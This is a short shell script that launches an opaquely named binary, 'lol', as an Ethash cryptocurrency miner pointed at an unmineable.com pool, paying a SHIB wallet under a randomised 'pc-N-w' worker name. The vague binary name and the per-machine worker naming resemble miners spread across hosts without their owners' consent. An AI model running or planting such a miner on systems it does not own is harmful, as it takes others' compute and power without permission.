POOL=ethash-us.unmineable.com:3333

WALLET=SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02

WORKER=$(echo pc-$(shuf -i 1-999 -n 1)-w)

chmod +x lol

./lol --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
